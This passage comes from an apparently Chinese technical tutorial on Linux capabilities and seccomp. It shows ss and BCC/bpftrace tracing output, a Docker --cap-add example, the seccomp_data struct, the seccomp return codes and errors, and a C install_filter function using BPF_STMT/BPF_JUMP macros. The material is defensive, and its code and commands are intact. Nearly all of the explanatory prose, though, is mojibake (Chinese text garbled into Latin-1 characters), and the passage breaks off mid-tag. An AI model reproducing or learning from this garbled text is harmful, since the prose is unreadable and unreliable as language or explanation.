æœ€åï¼Œæˆ‘ä»¬å¸Œæœ›ä½¿ç”¨pæ¿€æ´»è¯¥åŠŸèƒ½(ä¸æ˜¯å› ä¸ºæˆ‘ä»¬æ›´æ”¹äº† UID)ã€‚ æœ€ç»ˆæˆä¸º<code>cap_net_bind_service+eip</code>ã€‚</p><p>æ‚¨å¯ä»¥ä½¿ç”¨<code>ss</code>è¿›è¡ŒéªŒè¯ã€‚ æˆ‘ä»¬å°†å‰ªåˆ‡è¾“å‡ºä»¥ä½¿å…¶é€‚åˆæ­¤é¡µé¢ï¼Œä½†å®ƒä¼šæ˜¾ç¤ºç»‘å®šç«¯å£å’Œç”¨æˆ·IDï¼Œè€Œä¸æ˜¯ 0ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º 65534ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ss -tulpn -e -H | cut -d' ' -f17-</span><br><span class="line">*:80        *:* users:(("capabilities",pid=253996,fd=3)) uid:65534 ino:1512751 sk:6 cgroup:unreachable:1 v6only:0 &lt;-&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨æœ¬ä¾‹ä¸­ä½¿ç”¨äº†<code>capsh</code>ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨<code>libcap</code>ç¼–å†™åŒ…è£…å™¨ï¼›æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…<code>man 3 libcap</code></p><p>ä¸ºäº†æ›´å¥½åœ°ç†è§£æˆ‘ä»¬ç¨‹åºä½¿ç”¨çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨BCCæä¾›çš„åŠŸèƒ½å·¥å…·ï¼Œè¯¥å·¥å…·åœ¨å†…æ ¸å‡½æ•°<code>cap_capable</code> ä¸Šè®¾ç½®<code>kprobe</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt8]# /usr/share/bcc/tools/capable</span><br><span class="line">TIME      UID    PID    COMM             CAP  NAME                 AUDIT </span><br><span class="line">18:29:12  0      258056 barad_agent      1    CAP_DAC_OVERRIDE     1     </span><br><span class="line">18:29:12  0      258056 barad_agent      1    CAP_DAC_OVERRIDE     1     </span><br><span class="line">18:29:20  0      1210   YDService        19   CAP_SYS_PTRACE       1            </span><br><span class="line">18:29:22  0      258074 barad_agent      1    CAP_DAC_OVERRIDE     1   </span><br><span class="line">18:29:39  0      258733 capabilities     10   CAP_NET_BIND_SERVICE 1</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>bpftrace</code>å’Œ<code>cap_capable</code>å†…æ ¸å‡½æ•°ä¸Šçš„å•çº¿<code>kprobe</code>æ¥å®Œæˆç›¸åŒçš„æ“ä½œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt8]# bpftrace -e \ 'kprobe:cap_capable &#123;time("%H:%M:%S  "); printf("%-6d %-6d %-16s %-4d %d\n", uid, pid, comm, arg2, arg3); &#125;' | grep -i capabilities</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br></pre></td></tr></table></figure><p><code>Capabilities</code>é€šå¸¸ç”¨äºå®¹å™¨è¿è¡Œæ—¶ï¼Œå¦‚<code>runC</code>æˆ–<code>Docker</code>ï¼Œä»¥ä½¿å®¹å™¨æ— ç‰¹æƒå¹¶ä»…å…è®¸è¿è¡Œå¤§å¤šæ•°åº”ç”¨ç¨‹åºæ‰€éœ€çš„åŠŸèƒ½ã€‚ å½“åº”ç”¨ç¨‹åºéœ€è¦ç‰¹å®šåŠŸèƒ½æ—¶ï¼Œåœ¨<code>Docker</code>ä¸­å¯ä»¥ä½¿ç”¨<code>--cap-add</code>æ¥å®Œæˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --cap-add=NET_ADMIN ubuntu ip link add dummy0 type dummy</span><br></pre></td></tr></table></figure><p>æ­¤å‘½ä»¤å°†ä¸ºè¯¥å®¹å™¨æä¾›<code>CAP_NET_ADMIN</code>åŠŸèƒ½ï¼Œå…è®¸å®ƒè®¾ç½®ç½‘ç»œé“¾æ¥ä»¥æ·»åŠ <code>dummy0</code>æ¥å£ã€‚</p><p>ä¸‹ä¸€èŠ‚å°†å±•ç¤ºå¦‚ä½•å®ç°è¿‡æ»¤ç­‰åŠŸèƒ½ï¼Œä½†è¦ä½¿ç”¨å¦ä¸€ç§æŠ€æœ¯ï¼Œä»¥ç¼–ç¨‹æ–¹å¼å®ç°è‡ªå·±çš„è¿‡æ»¤å™¨ã€‚</p><h3 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h3><p><code>Seccomp</code>ä»£è¡¨å®‰å…¨è®¡ç®—ï¼Œå®ƒæ˜¯åœ¨Linuxå†…æ ¸ä¸­å®ç°çš„å®‰å…¨å±‚ï¼Œå…è®¸å¼€å‘äººå‘˜è¿‡æ»¤ç‰¹å®šçš„ç³»ç»Ÿè°ƒç”¨ã€‚å°½ç®¡<code>Seccomp</code>å¯ä»¥ä¸<code>capabilities</code>ç›¸åª²ç¾ï¼Œä½†å®ƒæ§åˆ¶ç‰¹å®šç³»ç»Ÿè°ƒç”¨çš„èƒ½åŠ›ç›¸æ¯”äº<code>capabilities</code>æ›´åŠ çµæ´»ã€‚</p><p><code>Seccomp</code>å’Œ<code>capabilities</code>ä¸ç›¸äº’æ’æ–¥ï¼› å®ƒä»¬ç»å¸¸ä¸€èµ·ä½¿ç”¨ ä¾‹å¦‚ï¼Œä½ å¸Œæœ›ä¸ºè¿›ç¨‹æä¾›<code>CAP_NET_ADMIN</code>åŠŸèƒ½ï¼Œä½†ä¸å…è®¸å®ƒé€šè¿‡é˜»æ­¢<code>accept</code>å’Œ<code>accept4</code>ç³»ç»Ÿè°ƒç”¨æ¥æ¥å—å¥—æ¥å­—ä¸Šçš„è¿æ¥ã€‚</p><p><code>Seccomp</code>è¿‡æ»¤å™¨çš„æ–¹å¼åŸºäº<code>SECCOMP_MODE_FILTER</code>æ¨¡å¼çš„BPFè¿‡æ»¤å™¨ï¼Œå¹¶ä¸”ç³»ç»Ÿè°ƒç”¨è¿‡æ»¤çš„å®Œæˆæ–¹å¼ä¸å¯¹æ•°æ®åŒ…çš„è¿‡æ»¤æ–¹å¼ç›¸åŒã€‚</p><p><code>Seccomp</code>è¿‡æ»¤å™¨é€šè¿‡<code>PR_SET_SECCOMP</code>æ“ä½œä½¿ç”¨<code>prctl</code>åŠ è½½ï¼›è¿™äº›è¿‡æ»¤å™¨ä»¥BP ç¨‹åºçš„å½¢å¼è¡¨ç¤ºï¼Œè¯¥ç¨‹åºåœ¨ä½¿ç”¨<code>seccomp_data</code>ç»“æ„è¡¨ç¤ºçš„æ¯ä¸ª<code>Seccomp</code>æ•°æ®åŒ…ä¸Šæ‰§è¡Œã€‚è¯¥ç»“æ„åŒ…å«å‚è€ƒæ¶æ„ã€ç³»ç»Ÿè°ƒç”¨æ—¶çš„CPUæŒ‡ä»¤æŒ‡é’ˆä»¥åŠæœ€å¤šå…­ä¸ªä»¥<code>uint64</code>è¡¨ç¤ºçš„ç³»ç»Ÿè°ƒç”¨å‚æ•°ã€‚</p><p>ä»¥ä¸‹æ˜¯<code>seccomp_data</code>ç»“æ„åœ¨<code>linux/seccomp.h</code>å†…æ ¸æºç ä¸­çš„æ ·å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span> </span><br><span class="line">  <span class="keyword">int</span> nr;</span><br><span class="line">  __u32 arch;</span><br><span class="line">  __u64 instruction_pointer;</span><br><span class="line">  __u64 args[<span class="number">6</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥åŸºäºç³»ç»Ÿè°ƒç”¨ã€åŸºäºå…¶å‚æ•°æˆ–åŸºäºå®ƒä»¬çš„ç»„åˆè¿›è¡Œè¿‡æ»¤ã€‚</p><p>åœ¨æ¥æ”¶åˆ°æ¯ä¸ª<code>Seccomp</code>æ•°æ®åŒ…åï¼Œè¿‡æ»¤å™¨æœ‰è´£ä»»è¿›è¡Œå¤„ç†ä»¥åšå‡ºæœ€ç»ˆå†³å®šï¼Œå‘Šè¯‰å†…æ ¸ä¸‹ä¸€æ­¥è¯¥åšä»€ä¹ˆã€‚æœ€ç»ˆå†³å®šé€šè¿‡å®ƒå¯ä»¥ç»™å‡ºçš„è¿”å›å€¼ï¼ˆçŠ¶æ€ä»£ç ï¼‰ä¹‹ä¸€è¡¨ç¤ºï¼Œå¦‚ä¸‹æ‰€è¿°ï¼š</p><p>SECCOMP_RET_KILL_PROCESSï¼šå®ƒä¼šåœ¨è¿‡æ»¤ç³»ç»Ÿè°ƒç”¨åç«‹å³ç»ˆæ­¢æ•´ä¸ªè¿›ç¨‹ï¼Œå› æ­¤ä¸ä¼šæ‰§è¡Œ</p><p>SECCOMP_RET_KILL_THREADï¼šå®ƒä¼šåœ¨è¿‡æ»¤ç³»ç»Ÿè°ƒç”¨åç«‹å³ç»ˆæ­¢å½“å‰çº¿ç¨‹ï¼Œå› æ­¤ä¸ä¼šæ‰§è¡Œ</p><p>SECCOMP_RET_KILLï¼šè¿™æ˜¯SECCOMP_RET_KILL_THREADçš„åˆ«åï¼Œä»¥ä¿æŒå…¼å®¹æ€§</p><p>SECCOMP_RET_TRAPï¼šç³»ç»Ÿè°ƒç”¨è¢«ç¦æ­¢ï¼ŒSIGSYSä¿¡å·è¢«å‘é€åˆ°è°ƒç”¨å®ƒçš„ä»»åŠ¡</p><p>SECCOMP_RET_ERRNOï¼šç³»ç»Ÿè°ƒç”¨æœªæ‰§è¡Œï¼Œè¿‡æ»¤å™¨è¿”å›å€¼çš„SECCOMP_RET_DATAéƒ¨åˆ†ä½œä¸º<code>errno</code>å€¼ä¼ é€’ç»™ç”¨æˆ·ç©ºé—´ã€‚æ ¹æ®é”™è¯¯çš„åŸå› ï¼Œè¿”å›ä¸åŒçš„<code>errno</code> </p><p>SECCOMP_RET_TRACEï¼šè¿™ç”¨äºé€šçŸ¥ä½¿ç”¨PTRACE_O_TRACESECCOMPçš„<code>ptrace</code>è·Ÿè¸ªå™¨åœ¨è°ƒç”¨ç³»ç»Ÿè°ƒç”¨è§‚å¯Ÿå’Œæ§åˆ¶ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œæ—¶è¿›è¡Œæ‹¦æˆªã€‚å¦‚æœæ²¡æœ‰é™„åŠ è·Ÿè¸ªå™¨ï¼Œåˆ™è¿”å›é”™è¯¯ï¼Œå°†<code>errno</code>è®¾ç½®ä¸º<code>-ENOSYS</code>ï¼Œå¹¶ä¸”ä¸æ‰§è¡Œç³»ç»Ÿè°ƒç”¨</p><p>SECCOMP_RET_LOGï¼šç³»ç»Ÿè°ƒç”¨è¢«å…è®¸å¹¶è¢«è®°å½•</p><p>SECCOMP_RET_ALLOWï¼šç³»ç»Ÿè°ƒç”¨è¢«å…è®¸</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptraceæ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºåœ¨è¿›ç¨‹ä¸Šå®ç°è·Ÿè¸ªæœºåˆ¶ï¼Œç§°ä¸ºtraceeï¼Œå…¶æ•ˆæœæ˜¯èƒ½å¤Ÿè§‚å¯Ÿå’Œæ§åˆ¶è¿›ç¨‹çš„æ‰§è¡Œã€‚è·Ÿè¸ªå™¨ç¨‹åºå¯ä»¥æœ‰æ•ˆåœ°å½±å“æ‰§è¡Œå¹¶æ›´æ”¹è¢«è·Ÿè¸ªè€…çš„å†…å­˜å¯„å­˜å™¨ã€‚åœ¨Seccompçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œptraceåœ¨ç”±SECCOMP_RET_TRACEçŠ¶æ€ç è§¦å‘æ—¶ä½¿ç”¨ï¼›å› æ­¤ï¼Œè·Ÿè¸ªå™¨å¯ä»¥é˜»æ­¢ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œå¹¶å®ç°è‡ªå·±çš„é€»è¾‘ã€‚</span><br></pre></td></tr></table></figure><h4 id="Seccompé”™è¯¯"><a href="#Seccompé”™è¯¯" class="headerlink" title="Seccompé”™è¯¯"></a>Seccompé”™è¯¯</h4><p>æœ‰æ—¶ï¼Œåœ¨ä½¿ç”¨<code>Seccomp</code>æ—¶ä¼šé‡åˆ°ç”±SECCOMP_RET_ERRNOç±»å‹çš„è¿”å›å€¼ç»™å‡ºçš„ä¸åŒé”™è¯¯ã€‚ä¸ºäº†é€šçŸ¥å‘ç”Ÿé”™è¯¯ï¼Œ<code>seccomp</code>ç³»ç»Ÿè°ƒç”¨å°†è¿”å›-1è€Œä¸æ˜¯0ã€‚</p><p>å¯èƒ½çš„é”™è¯¯å¦‚ä¸‹ï¼š</p><p>EACCESSï¼šä¸å…è®¸è°ƒç”¨è€…è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè¿™é€šå¸¸æ˜¯å› ä¸ºå®ƒæ²¡æœ‰<code>CAP_SYS_ADMIN</code>æƒé™æˆ–æ²¡æœ‰ä½¿ç”¨<code>prctl</code>è®¾ç½® <code>no_new_privs</code></p><p>EFAULTï¼šä¼ é€’çš„å‚æ•°ï¼ˆ<code>seccomp_data</code>ç»“æ„ä¸­çš„å‚æ•°ï¼‰æ²¡æœ‰æœ‰æ•ˆåœ°å€</p><p>EINVALï¼šå®ƒå¯ä»¥æœ‰å››ç§å«ä¹‰</p><ul><li>æ­¤å†…æ ¸åœ¨å…¶å½“å‰é…ç½®ä¸­ä¸çŸ¥é“æˆ–ä¸æ”¯æŒè¯·æ±‚çš„æ“ä½œ</li><li>æŒ‡å®šçš„æ ‡å¿—å¯¹è¯·æ±‚çš„æ“ä½œæ— æ•ˆ</li><li>æ“ä½œåŒ…æ‹¬<code>BPF_ABS</code>ï¼Œä½†æ˜¯æŒ‡å®šçš„åç§»é‡æœ‰é—®é¢˜ï¼Œå¯èƒ½è¶…è¿‡<code>seccomp_data</code>ç»“æ„çš„å¤§å°</li><li>ä¼ é€’ç»™è¿‡æ»¤å™¨çš„æŒ‡ä»¤æ•°è¶…è¿‡äº†æœ€å¤§æŒ‡ä»¤æ•°</li></ul><p>ENOMEMï¼šæ²¡æœ‰è¶³å¤Ÿçš„å†…å­˜æ¥æ‰§è¡Œç¨‹åº</p><p>EOPNOTSUPPï¼šè¯¥æ“ä½œä½¿ç”¨SECCOMP_GET_ACTION_AVAILæŒ‡å®šï¼Œä½†å®é™…ä¸Šå†…æ ¸ä¸æ”¯æŒå‚æ•°ä¸­çš„è¿”å›æ“ä½œ</p><p>ESRCHï¼šåŒæ­¥å¦ä¸€ä¸ªçº¿ç¨‹æ—¶å‡ºç°é—®é¢˜</p><p>ENOSYSï¼šSECCOMP_RET_TRACEæ“ä½œæ²¡æœ‰é™„ç€è·Ÿè¸ªå™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctlæ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå®ƒå…è®¸ç”¨æˆ·ç©ºé—´ç¨‹åºæ§åˆ¶ï¼ˆè®¾ç½®å’Œè·å–ï¼‰è¿›ç¨‹çš„ç‰¹å®šæ–¹é¢ï¼Œä¾‹å¦‚å­—èŠ‚åºã€çº¿ç¨‹åç§°ã€å®‰å…¨è®¡ç®— (Seccomp) æ¨¡å¼ã€æƒé™ã€Perfäº‹ä»¶ç­‰ã€‚</span><br></pre></td></tr></table></figure><p><code>Seccomp</code>å¯èƒ½å¬èµ·æ¥åƒæ˜¯ä¸€ç§æ²™ç›’æœºåˆ¶ï¼Œä½†äº‹å®å¹¶éå¦‚æ­¤ã€‚<code>Seccomp</code>æ˜¯ä¸€ä¸ªå®ç”¨ç¨‹åºï¼Œå¯è®©å…¶ç”¨æˆ·å¼€å‘æ²™ç›’æœºåˆ¶ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°†ä»‹ç»å¦‚ä½•ç¼–å†™ç¨‹åºæ¥ä½¿ç”¨<code>Seccomp</code>ç³»ç»Ÿè°ƒç”¨ç›´æ¥è°ƒç”¨çš„è¿‡æ»¤å™¨æ¥ç¼–å†™è‡ªå®šä¹‰äº¤äº’ã€‚</p><h4 id="Seccomp-BPFè¿‡æ»¤å™¨ç¤ºä¾‹"><a href="#Seccomp-BPFè¿‡æ»¤å™¨ç¤ºä¾‹" class="headerlink" title="Seccomp BPFè¿‡æ»¤å™¨ç¤ºä¾‹"></a>Seccomp BPFè¿‡æ»¤å™¨ç¤ºä¾‹</h4><p>åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•å°†å‰é¢æè¿°çš„ä¸¤ä¸ªæ“ä½œæ”¾åœ¨ä¸€èµ·ï¼š</p><ul><li>ç¼–å†™Seccomp BPFç¨‹åºä»¥ç”¨ä½œè¿‡æ»¤å™¨ï¼ŒåŸºäºåšå‡ºçš„å†³å®šè¿”å›ä¸åŒçš„ä»£ç </li><li>ä½¿ç”¨<code>prctl</code>åŠ è½½è¿‡æ»¤å™¨</li></ul><p>é¦–å…ˆï¼Œè¯¥ç¤ºä¾‹éœ€è¦æ¥è‡ªæ ‡å‡†åº“å’ŒLinuxå†…æ ¸çš„ä¸€äº›å¤´æ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>åœ¨å°è¯•æ‰§è¡Œè¿™ä¸ªä¾‹å­ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿æˆ‘ä»¬çš„å†…æ ¸å·²ç»å°†<code>CONFIG_SECCOMP</code>å’Œ <code>CONFIG_SECCOMP_FILTER</code>è®¾ç½®ä¸ºyã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œæ£€æŸ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/config.gz| zcat | grep -i CONFIG_SECCOMP</span><br><span class="line">or</span><br><span class="line">cat /usr/src/kernels/&lt;linux-src&gt;/.config | grep -i CONFIG_SECCOMP</span><br></pre></td></tr></table></figure><p>å…¶ä½™ä»£ç æ˜¯<code>install_filter</code>å‡½æ•°ï¼Œç”±ä¸¤éƒ¨åˆ†ç»„æˆã€‚ ç¬¬ä¸€éƒ¨åˆ†åŒ…å«BPFè¿‡æ»¤æŒ‡ä»¤åˆ—è¡¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">install_filter</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">int</span> arch, <span class="keyword">int</span> error)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] = &#123;</span></span><br><span class="line">    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, arch))),</span><br><span class="line">    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, arch, <span class="number">0</span>, <span class="number">3</span>),</span><br><span class="line">    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),</span><br><span class="line">    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, nr, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (error &amp; SECCOMP_RET_DATA)),</span><br><span class="line">    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>è¿™äº›æŒ‡ä»¤æ˜¯ä½¿ç”¨<code>linux/filter.h</code>ä¸­å®šä¹‰çš„<code>BPF_STMT</code>å’Œ<code>BPF_JUMP</code>å®è®¾ç½®çš„ã€‚</p><p>è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹è¯´æ˜ï¼š</p><p>BPF_STMT(BPF_LD + BPF_W + BPF_ABS (offsetof(struct seccomp_data, arch)))ï¼šä»¥å­—<code>BPF_W</code>ä¸<code>BPF_LD</code> çš„å½¢å¼ä¸€èµ·åŠ è½½å’Œç´¯åŠ ï¼Œå¹¶ä¸”æ•°æ®åŒ…æ•°æ®åŒ…å«åœ¨å›ºå®šçš„<code>BPF_ABS</code>åç§»é‡ä¸­</p><p>BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, arch, 0, 3)ï¼šä½¿ç”¨<code>BPF_JEQ</code>æ£€æŸ¥ç´¯åŠ å™¨å¸¸é‡<code>BPF_K</code>ä¸­çš„æ¶æ„å€¼æ˜¯å¦ç­‰äº<code>arch</code>ã€‚ å¦‚æœæ˜¯ï¼Œå®ƒå°†ä»¥åç§»é‡0è·³è½¬åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼›å¦åˆ™ï¼Œå®ƒå°†ä»¥åç§»é‡3è·³è½¬å¹¶ç»™å‡ºé”™è¯¯</p><p>BPF_STMT(BPF_LD + BPF_W + BPF_ABS (offsetof(struct seccomp_data, nr)))ï¼šä»¥å­—<code>BPF_W</code>ä¸<code>BPF_LD</code>çš„å½¢å¼ä¸€èµ·åŠ è½½å¹¶ç´¯åŠ ï¼Œè¿™æ˜¯åŒ…å«åœ¨å›ºå®š<code>BPF_ABS</code>åç§»å¤„çš„ç³»ç»Ÿè°ƒç”¨æ•°å€¼æ•°æ®</p><p>BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, nr, 0, 1)ï¼šå°†ç³»ç»Ÿè°ƒç”¨å·ä¸­çš„å€¼ä¸nrå˜é‡ä¸­çš„å€¼è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœç›¸ç­‰ï¼Œå°†è½¬åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤å¹¶ç¦æ­¢ç³»ç»Ÿè°ƒç”¨ï¼›å¦åˆ™å°†å…è®¸å¸¦æœ‰SECCOMP_RET_ALLOWçš„ç³»ç»Ÿè°ƒç”¨</p><p>BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (error &amp; SECCOMP_RET_DATA))ï¼šè¿™å°†ä½¿ç”¨ <code>BPF_RET</code>ç»ˆæ­¢ç¨‹åºå¹¶ä½œä¸ºç»“æœç»™å‡ºé”™è¯¯SEC COMP_RET_ERRNOï¼Œå¹¶å¸¦æœ‰æ¥è‡ª<code>err</code>å˜é‡çš„æŒ‡å®šé”™è¯¯å·</p><p>BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)ï¼šä½¿ç”¨<code>BPF_RET</code>ç»ˆæ­¢ç¨‹åºå¹¶å…è®¸ä½¿ç”¨ SECCOMP_RET_ALLOWæ‰§è¡Œç³»ç»Ÿè°ƒç”¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä½ å¯èƒ½ä¼šæƒ³ä¸ºä»€ä¹ˆè¦ä½¿ç”¨æŒ‡ä»¤åˆ—è¡¨è€Œä¸æ˜¯ç¼–è¯‘åçš„ELFå¯¹è±¡æˆ–JITç¼–è¯‘çš„Cç¨‹åºï¼Ÿ</span><br><span class="line">ä¸»è¦æœ‰ä¸¤ä¸ªåŸå› </span><br><span class="line">1.é¦–å…ˆæ˜¯Seccompä½¿ç”¨cBPFï¼ˆç»å…¸BPFï¼‰è€Œä¸æ˜¯eBPFï¼Œè¿™æ„å‘³ç€å®ƒæ²¡æœ‰æ³¨å†Œè¡¨ï¼Œè€Œåªæ˜¯ä¸€ä¸ªç´¯åŠ å™¨æ¥å­˜å‚¨æœ€åçš„è®¡ç®—ç»“æœã€‚</span><br><span class="line">2.ç¬¬äºŒä¸ªæ˜¯Seccompç›´æ¥æ¥å—ä¸€ä¸ªæŒ‡å‘BPFæŒ‡ä»¤æ•°ç»„çš„æŒ‡é’ˆï¼Œæ²¡æœ‰åˆ«çš„ã€‚æˆ‘ä»¬ä½¿ç”¨çš„å®åªæ˜¯ä»¥ä¸€ç§å‹å¥½çš„æ–¹å¼æŒ‡å®šè¿™äº›æŒ‡ä»¤çš„åŠ©æ‰‹ã€‚</span><br></pre></td></tr></table></figure><p>åœ¨<code>socket_filter</code>ç»“æ„ä½“ä¸­å®šä¹‰è¿‡æ»¤å™¨ä»£ç åï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰ä¸€ä¸ª<code>sock_fprog</code>åŒ…å«è¿‡æ»¤å™¨ä»£ç å’Œè¿‡æ»¤å™¨æœ¬èº«çš„è®¡ç®—é•¿åº¦ã€‚éœ€è¦æ­¤æ•°æ®ç»“æ„ä½œä¸ºå£°æ˜æµç¨‹æ“ä½œçš„å‚æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> = &#123;</span></span><br><span class="line">    .len = (<span class="keyword">unsigned</span> short)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">    .filter = filter,</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬åœ¨<code>install_filter</code>å‡½æ•°ä¸­åªå‰©ä¸€ä»¶äº‹è¦åšï¼šåŠ è½½ç¨‹åºæœ¬èº«ï¼ ä¸ºæ­¤ï¼Œæˆ‘ä»¬ä½¿ç”¨PR_SET_SECCOMP ä½œä¸ºé€‰é¡¹ä½¿ç”¨<code>prctl</code>ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¿›å…¥å®‰å…¨è®¡ç®—æ¨¡å¼ã€‚ ç„¶åæˆ‘ä»¬æŒ‡ç¤ºæ¨¡å¼ä½¿ç”¨SECCOMP_MODE_FILTERåŠ è½½è¿‡æ»¤å™¨ï¼Œè¯¥è¿‡æ»¤å™¨åŒ…å«åœ¨æˆ‘ä»¬çš„<code>sock_fprog</code>ç±»å‹çš„<code>prog</code>å˜é‡ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 